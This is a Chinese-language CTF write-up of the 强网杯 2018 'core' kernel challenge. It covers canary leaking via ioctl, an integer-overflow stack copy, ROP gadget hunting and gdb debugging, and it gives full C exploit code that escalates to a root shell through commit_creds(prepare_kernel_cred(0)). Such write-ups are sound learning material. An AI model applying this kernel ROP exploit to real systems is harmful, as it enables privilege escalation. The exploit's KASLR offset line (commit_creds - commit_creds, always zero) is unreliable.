一道十分基础的内核pwn入门题
## 例题：强网杯2018 - core
## 0. 反编译代码分析
文件里面包含了这几个文件
        `bzImage`,`core.cpio`,`start.sh`,`vmlinux`
先看看start.sh
```
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
``` 

可以看到咱们这儿题目采用了kaslr ，有地址随机，所以咱们需要泄露地址，大致思路和用户态一致。这里还注意那就是从ctfwiki上面下载下来的题目是-m 64M,这里会出现运行不了虚拟机的情况，所以咱们改为128M即可，这是内存大小的定义，太小了跑不动。

之后咱们再看看文件系统解压后得到的init脚本
```
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mv exp.c /
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko
#setsid /bin/cttyhack setuidgid 0 /bin/sh

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f

```
  
从中我们可以看到文件系统中insmod了一个core.ko，一般来讲这就是漏洞函数了，还有咱们可以添加`setsid /bin/cttyhack setuidgid 0 /bin/sh`这一句来使得我们进入虚拟机的时候就是root权限，大伙不必惊慌，这里是因为咱们是再本地需要进行调试，所以init脚本任我们改，start脚本也是，咱们可以直接把kalsr关了也行，但关了并不代表咱们不管，咱们这一举动主要是为了方便调试的，最终打远程还是人家说了算，咱们值有一个exp能提交。
接着分析init，这里还发现开始时内核符号表被复制了一份到`/tmp/kalsyms`中，利用这个我们可以获得内核中所有函数的地址，还有个恶心的地方那就是这里开启了定时关机，咱们可以把这给先注释掉`poweroff -d 120 -f &`


进入漏洞模块的分析
![]([img]http://imgsrc.baidu.com/super/pic/item/42166d224f4a20a438bb7e05d5529822730ed04f.jpg[/img])
    
这里可以看到有canary和NX，所以咱们通过ROP的话需要进行canary泄露。
接下来咱们分析相关函数init_moddule
![]([img]http://imgsrc.baidu.com/super/pic/item/a9d3fd1f4134970ac9d052edd0cad1c8a6865d55.jpg[/img])
   
可以看到模块加载的初期会创建一个名为`core`的进程，在虚拟机中在/proc目录下
在看看比较重要的ioctl函数
![]([img]http://imgsrc.baidu.com/super/pic/item/77c6a7efce1b9d162f5ed8a3b6deb48f8d546453.jpg[/img])
   
可以看出有三个模式选择，分别点入相关函数看
   
![]([img]http://imgsrc.baidu.com/super/pic/item/77094b36acaf2edd18640b2bc81001e93801935f.jpg[/img])
---

这里的read函数就是向用户指定的地址从off偏移地址写入64个字节.
而从ioctl中第二个case可以看到咱们居然可以设置off，所以我们可以通过设置偏移来写入canary的值，而我们从ida中可以看到咱们的canary是位于这里
   
---
   
![]([img]http://imgsrc.baidu.com/super/pic/item/a5c27d1ed21b0ef40362da9c98c451da80cb3e6d.jpg[/img])
   
可以知道相差对于v5相差0x40，所以咱们设置的off也是0x40
   
我们还可以来看看file_operations,(不秦楚的大伙可以看看我的上一篇环境搭建的文章)，可以看到他只实现了write，ioctl，release的系统调用：
   
![]([img]http://imgsrc.baidu.com/super/pic/item/50da81cb39dbb6fd4da7a7e44c24ab18962b3777.jpg[/img])
   
---
   
![]([img]http://imgsrc.baidu.com/super/pic/item/6d81800a19d8bc3e40f74408c78ba61ea9d34571.jpg[/img])
    
---
    

![]([img]http://imgsrc.baidu.com/super/pic/item/7aec54e736d12f2e7ffceca20ac2d56284356873.jpg[/img])

我们再来看看其他函数，先看core_write
![]([img]http://imgsrc.baidu.com/super/pic/item/8694a4c27d1ed21b193c6c27e86eddc450da3f7e.jpg[/img])
这里可以知道他总共可以向name这个地址写入0x800个字节，心动
我们再来看看ioctl中第三个选项的core_copy_func
![]([img]http://imgsrc.baidu.com/super/pic/item/810a19d8bc3eb135c137f579e31ea8d3fc1f4404.jpg[/img])
发现他可以从name上面拷贝数据到达栈上，然后这个判断存在着整形溢出，这里如果咱传个负数就可以达成效果了。
## 1. Kernel ROP
既然咱们可以在栈上做手脚，那么我们就可以利用ROP的方式了，首先找几个gadget，这里的gadget是需要在vmlinux中寻找，我的推荐是用
```
objdump -d ./vmlinux > ropgadget \
cat ropgadget | grep "pop rdi; ret"
```
这样的类型进行寻找[/md]
[md]### 1.寻找gadget
如图：
对于上面所说的比较关键的两个函数`commit_creds`以及`prepare_kernel_cred`,我们在vmlinux中去寻找他所加载的的地址
然后我们可以看看ropgadget文件
![]([img]http://imgsrc.baidu.com/super/pic/item/aec379310a55b319d78ccdb706a98226cefc17fe.jpg[/img])
从中咱们可以看到其中即我们所需要的gadget(实际上就是linux内核镜像所使用的汇编代码)，此时我们再通过linux自带的grep进行搜索，个人认为还是比较好用的，用`ropgadget`或者是`ropper`来说都可以，看各位师傅的喜好来.具体使用情况如下：
![]([img]http://imgsrc.baidu.com/super/pic/item/b8389b504fc2d562427a9f2fa21190ef77c66c86.jpg[/img])
以此手法获得两个主要函数的地址后，此刻若咱们在exp中获得这两个函数的实际地址，然后将两者相减即可得到KASLR的偏移地址。
自此咱们继续搜索别的gadget，我们此刻需要的gadget共有如下几个：
```
swapgs; popfq;  ret;
mov rdi, rax;  call rdx; 
pop rdx; ret;  
pop rdi; ret;   
pop rcx; ret; 
iretq
```

师傅们可以用上述方法自行寻找.

### 2. 自行构造返回状态
虽然咱们的**提权**是在内核态当中，但我们最终还是需要返回用户态来得到一个root权限的shell，所以当我们进行栈溢出rop之后还需要利用swapgs等保存在内核栈上的寄存器值返回到应得的位置，但是如何保证返回的时候不出错呢，对，那就只能在调用内核态的时候将即将保存的正确的寄存器值先保存在咱们自己申请的值里面，这样就方便咱们在rop链结尾填入他们实现返回不报错。既然涉及到了保存值，那我们就需要内嵌汇编代码来实现此功能，代码如下，这也可以视为一个通用代码；
```
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}

```
大伙学到了内核pwn，那汇编功底自然不必说，我就不解释这段代码功能了。

### 3. 攻击思路
现在开始咱们的攻击思路思考，在上面介绍各个函数的时候我也稍微讲了点。我们所做的事主要如下：
> 1. 利用ioctl中的选项2.修改off为0x40
> 
> 2. 利用core_read,也就是ioctl中的选项1,可将局部变量v5的off偏移地址打印,经过调试可发现这里即为canary
>  
> 3. 当咱们打印了canary,现在即可进行栈溢出攻击了,但是溢出哪个栈呢,我们发现ioctl的第三个选项中调用的函数 `core_copy_func`,会将bss段上的name输入在栈上,输入的字节数取决于咱们传入的数字,并且此时他又整型溢出漏洞,好,就决定冤大头是他了
> 4. core.ko 所实现的系统调用write可以发现其中可以将我们传入的值写到bss段中的name上面,天助我也,所以咱们就可以在上面适当的构造rop链进行栈溢出了
   
大伙看到这里是不是觉得有点奇怪,欸,刚才不是说要泄露地址码,这兄弟是不是讲错了,就这?大家不要慌,我这正要讲解,从上面的init脚本中我们可以看到这一句:
```
cat /proc/kallsyms > /tmp/kallsyms
```
其中 /proc/kallsyms中包含了内核中所有用到的符号表,而处于用户态的我们是不能访问的,所以出题人贴心的将他输出到了/tmp/kallsyms中,这就使得我们在用户态也依然可以访问了,所以我们还得在exp中写一个文件遍历的功能,当然这对于学过系统编程的同学并不在话下,(可是我上这课在划水....)
这里贴出代码给大伙先看看
```
void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }

}
```

当知道exp思路之后,其他的一切就简单起来,只需要看懂他然后实现即可.
### 4. gbb调试qemu中内核基本方法
#### 众所周知,调试在pwn中是十分重要的,特别是动调,所以这里介绍下gdb调试内核的方法
由于咱们的内核是跑在qemu中,所以我们gdb需要用到远程调试的方法,但是如果直接连端口的话会出现没符号表不方便调试的,所以我们需要自行导入内核模块,也就是文件提供的`vmlinux`,之后由于咱们还需要core.ko的符号表,所以咱们也可以通过自行导入来获得可以,通过 `add-symbol-file core.ko textaddr` 加载 ,而这里的`textaddr`即为`core.ko`的`.tex`t段地址,我们可以通过修改`init`中为`root`权限进行设置.
这里.text 段的地址可以通过 `/sys/modules/core/section/.text` 来查看，
这里强烈建议大伙先关kaslr(通过在启动脚本修改,就是将kaslr改为nokaslr)再进行调试,效果图如下
![]([img]http://imgsrc.baidu.com/super/pic/item/5882b2b7d0a20cf48316b11d33094b36adaf996a.jpg[/img])
我们可以通过` -gdb tcp:port `或者 `-s `来开启调试端口，`start.sh` 中已经有了 -s，不必再自己设置。(对了如果-s ,他的功能等同于-gdb tcp:1234)
在我们获得.text基地址后记得用脚本来开gdb,不然每次都要输入这么些个东西太麻烦了,脚本如下十分简单:
```
#!/bin/bash
gdb -q \
  -ex "" \
  -ex "file ./vmlinux" \
  -ex "add-symbol-file ./extract/core.ko 0xffffffffc0000000" \
  -ex "b core_copy_func" \
  -ex "target remote localhost:1234" \
```

其中打断点可以先打在core_read,这里打在core_copy_func是我调到尾声修改的.这里还注意一个点,就是当采用pwndbg的时侯需要root权限才可以进行调试不然会出现以下错误
![]([img]http://imgsrc.baidu.com/super/pic/item/77094b36acaf2edd1b05062bc81001e938019378.jpg[/img])
最开始气死我了,人家peda都不要root,但是最开始不清楚为什么会错,我还以为是版本问题,但想到这是我最近刚配的一台机子又应该不是,其实最开始看到permission就该想到的,害.
我们用root权限进行开调
![]([img]http://imgsrc.baidu.com/super/pic/item/0824ab18972bd40717299c3f3e899e510eb30901.jpg[/img])
可以看到十分的成功,此刻我continue,还记得咱们下的断电码,b core_read,如果咱们调用它后咱们就会在这里停下来,此刻我们运行咱们的程序试试
![]([img]http://imgsrc.baidu.com/super/pic/item/b7003af33a87e950aaf6bcae55385343faf2b40b.jpg[/img])
这样咱们就可以愉快的进行调试啦,至此gdb调试内核基本方法到此结束~~~
### 5. ROP链解析
这里简单讲讲,直接给图
![]([img]http://imgsrc.baidu.com/super/pic/item/7c1ed21b0ef41bd5b84aa63614da81cb38db3dd2.jpg[/img])
相信大家理解起来不费力.

### 6. exp
本次exp如下,大伙看看
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = NULL, prepare_kernel_cred = NULL;        // address of to key function
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RDI_RET 0xffffffff81000b2f  
#define POP_RCX_RET 0xffffffff81021e53
#define IRETQ 0xffffffff81050ac2 
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

/*void saveStatus();
void get_function_address();
#void core_read(int fd, char* buf);
void change_off(int fd, long long off);
void core_copy_func(int fd, long long nbytes);
void print_binary(char* buf, int length);
void shell();
*/
void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}

void core_read(int fd, char *addr){
  printf("try read\n");
  ioctl(fd,0x6677889B,addr);
  printf("read done!");
}

void change_off(int fd, long long off){
  printf("try set off \n");
  ioctl(fd,0x6677889C,off);
}

void core_copy_func(int fd, long long nbytes){
  puts("try cp\n");
  ioctl(fd,0x6677889A,nbytes);
}

void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }
}


void shell(){
        if(getuid()){
                printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
                exit(1);
        }
        printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
        system("/bin/sh");
        exit(0);
}

int main(){
  saveStatus();
  int fd = open("/proc/core",2);              //get the process fd
  if(!fd){
                printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
                exit(1);
        }
  char buffer[0x100] = {0};
        get_function_address();                // get addresses of two key function
  ssize_t vmlinux = commit_creds - commit_creds;            //base address
  printf("vmlinux_base = %x",vmlinux);
  //get canary 
  size_t canary;
  change_off(fd,0x40);
  //getchar();
  
  core_read(fd,buffer);
  canary = ((size_t *)buffer)[0];
  printf("canary ==> %p\n",canary);
  //build the ROP
  size_t rop_chain[0x1000] ,i= 0;
  printf("construct the chain\n");
  for(i=0; i< 10 ;i++){
    rop_chain[i] = canary;
  }
  rop_chain[i++] = POP_RDI_RET + vmlinux ; 
  rop_chain[i++] = 0;
  rop_chain[i++] = prepare_kernel_cred ;          //prepare_kernel_cred(0)
  rop_chain[i++] = POP_RDX_RET + vmlinux;
  rop_chain[i++] = POP_RCX_RET + vmlinux;
  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;
  rop_chain[i++] = commit_creds ;
  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;
  rop_chain[i++] = 0;
  rop_chain[i++] = IRETQ + vmlinux;
  rop_chain[i++] = (size_t)shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp;
  rop_chain[i++] = user_ss;
  write(fd,rop_chain,0x800);
  core_copy_func(fd,0xffffffffffff0100); 
}

```

### 7. 编译运行
这里哟个小知识,那就是在被攻击的内核中一般不会给你库函数,所以咱们需要用gcc中的-static参数进行静态链接,然后就是为了支持内嵌汇编代码,所以我们需要使用`-masm=intel`,这里intel也可以换amd,看各位汇编语言用的啥来进行修改.我这里用的把保存状态代码是intel支持的.
```
gcc test.c -o test -static -masm=intel -g
```
将此编译得到的二进制文件打包近文件系统然后重新启动,情况如图
![](http://imgsrc.baidu.com/super/pic/item/faf2b2119313b07e6cb81eca49d7912396dd8cef.jpg)
##### **成功提权!!!!!**

# 0x05总结
为了学这一个题目所需要的知识还是费了点功夫的,需要对于驱动等环境的理解然后就是遇到困难之后静下心寻找问题的耐心,还有最重要的一点就是细心,就因为最后一个sp错写成ss导致一直打不通.
